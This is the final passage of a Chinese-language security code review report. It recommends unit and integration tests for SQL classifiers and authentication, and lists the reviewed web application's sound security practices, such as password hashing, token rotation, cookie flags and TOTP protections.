1. 为 SQL 分类器（`isWriteSql`、`isForbiddenSql`、`isDestructiveSql`）添加全面的单元测试，包括 CTE 嵌套、注释绕过等边界情况
2. 为认证流程（注册、登录、2FA、令牌轮换）添加集成测试
3. 为速率限制、权限检查添加测试
4. 为邮件模板添加 snapshot 测试

---

## 值得肯定的设计

尽管存在上述问题，项目在多个方面展现了良好的安全实践：

- ✅ **密码处理**: PBKDF2-SHA256 + 32 字节随机盐 + 恒定时间比较
- ✅ **令牌安全**: JWT 类型字段防止令牌混淆；Refresh Token 轮换 + JTI 拒绝列表
- ✅ **Cookie 安全**: HttpOnly + SameSite=Strict + Path=/
- ✅ **SQL 注入防护**: 所有管理 SQL 使用参数化查询（`.bind()`）
- ✅ **TABLE_PREFIX 验证**: 正则表达式约束为 `[A-Za-z0-9_]+`
- ✅ **用户枚举防护**: 密码重置和验证邮件重发使用统一响应
- ✅ **前端令牌存储**: 仅使用内存变量，不使用 localStorage（防 XSS 窃取）
- ✅ **TOTP 密钥加密**: 使用 AES-GCM 加密存储，随机 IV
- ✅ **TOTP 重放防护**: KV 中记录已使用的 OTP 代码
- ✅ **安全头部**: X-Content-Type-Options、X-Frame-Options、Referrer-Policy 等
- ✅ **审计日志**: 关键操作均记录到 audit_logs 表
- ✅ **Refresh Token 轮换**: 每次刷新都签发新的 Refresh Token 并撤销旧的
- ✅ **密码修改后会话失效**: 通过 `sessionInvalidatedAt` 机制
- ✅ **前端无 XSS 向量**: 没有使用 `dangerouslySetInnerHTML`，React 自动转义文本内容

---

*本报告仅为代码审查结果，不保证覆盖所有潜在问题。标注"待确认"的发现需要进一步验证。*
